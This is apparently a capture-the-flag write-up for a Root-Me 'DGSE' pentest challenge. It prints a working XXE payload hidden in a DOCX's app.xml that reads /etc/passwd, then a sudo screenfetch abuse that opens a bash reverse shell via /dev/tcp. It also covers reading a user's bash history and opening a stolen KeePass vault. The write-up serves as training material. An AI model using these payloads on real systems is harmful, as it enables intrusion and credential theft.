---
layout: post
title: 'DGSE Hacks: Pentest (M4) Challenges'
date: 2025-04-20
categories: [docs]
tag: [dgse mission, dgse, mission, dgse.pro.root-me, root-me, root me, hacking dgse,pentest, WebExploitation, RootMe, AIHacking, DGSE]
---

##  Pentest (Mission 4)
During testing of the file upload functionality on the target website, I discovered that uploading a DOCX document resulted in the disclosure of a victim ID associated with the uploaded file. 

![webiste-dgse](/assets/webiste-dgse.png "webiste-dgse")

The server responded with a victim ID linked to the uploaded DOCX file, so the first thing to investigate was whether this ID was embedded in the document's metadata

(about the DOCX file based on your initial findings from the first AI mission)

![upload](/assets/upload.png "upload")

using exiftool, we confirmed that the Victim ID is exposed in the document's metadata :
![exiftool](/assets/exiftool.png "exiftool")

I examined the DOCX file structure by:
- Unzipping the DOCX (since it's a ZIP archive) to access its internal files
- Identified that the file (docProps/app.xml)  contains a VictimID field in its XML structure
- The potential for XML External Entity (pasword) processing vulnerabilities
- i edit file :

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Properties [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <VictimID>&xxe;</VictimID>
</Properties>
```
- then zip it now and upload it in website :
![zip](/assets/zip.png "zip")

got it : 
![xxe](/assets/xxe.png "xxe")

Now, XXE exists on this site. I successfully read /etc/passwd after spending a lot of time searching for readable files to gain access to the machine. 

Based on /etc/passwd, I found the user: `document-user`. 

Let’s read their command history at `/home/document-user/.bash_history`.

![pasword](/assets/pasword.png "pasword")

scan ports : 

![scan](/assets/scan.png "scan")

And we can see port 22222 is used for SSH. Let’s try to connect via SSH :


![session](/assets/session.png "session")

The user executor is allowed to run the following command as the user administrator without being prompted for a password:
```bash
/usr/bin/screenfetch
```

screenfetch is a bash script that collects and displays system information in a visually appealing way, 
screenfetch allows setting arbitrary variables with -o , so we used to execute arbitraty code 'reverse shell' 
```bash
sudo -u administrator /usr/bin/screenfetch -o 'fulloutput=$(bash -c "bash -i >& /dev/tcp/localhost/4444 0>&1")'
```

![poc](/assets/poc.png "poc")

In home Folder :
```bash 
administrator@document-station:~$ ls
ls
logo.jpg
vault.kdbx
```
We transferred these two files—`logo.jpg` and `vault.kdbx`—to my machine : `base64 copy-paste transfer`

i try to get hash of kdbx but its version 4  :
```bash
➜  shares keepass2john vault.kdbx 
! vault.kdbx : File version '40000' is currently not supported!
```
After a long time cracking and searching for any possible key or backup, I tested `logo.jpg as the encryption key for the KDBX database—and it worked!` (LOL) 

![kdbx](/assets/kdbx.png "kdbx")

and boom get flag from `OPERATIONS NOTES` :

![flag](/assets/flag.png "flag")

TY FOR READING !